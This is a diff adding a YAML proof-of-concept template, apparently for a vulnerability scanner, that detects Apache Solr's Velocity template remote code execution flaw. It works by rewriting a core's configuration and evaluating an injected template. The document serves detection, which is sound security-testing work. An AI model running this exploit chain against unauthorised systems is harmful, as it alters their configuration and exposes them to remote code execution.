@@ -1,0 +1,38 @@
+name: poc-yaml-solr-velocity-template-rce
+set:
+  r1: randomInt(20000, 40000)
+  r2: randomInt(20000, 40000)
+rules:
+  - method: GET
+    path: "/solr/admin/cores?wt=json"
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"responseHeader")
+    search: |
+      "name":"(?P<core>[^"]+)"
+  - method: POST
+    path: >-
+      /solr/{{core}}/config
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+        "update-queryresponsewriter": {
+          "startup": "test",
+          "name": "velocity",
+          "class": "solr.VelocityResponseWriter",
+          "template.base.dir": "",
+          "solr.resource.loader.enabled": "true",
+          "params.resource.loader.enabled": "true"
+        }
+      }
+    expression: response.status == 200
+  - method: GET
+    path: "/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c"
+    follow_redirects: false
+    expression: response.body.bcontains(bytes(string(r1 * r2)))
+detail:
+  author: Loneyer
+  description: 'Apache Solr RCE via Velocity template'
+  links:
+    - https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
+    - https://cert.360.cn/warning/detail?id=fba518d5fc5c4ed4ebedff1dab24caf2
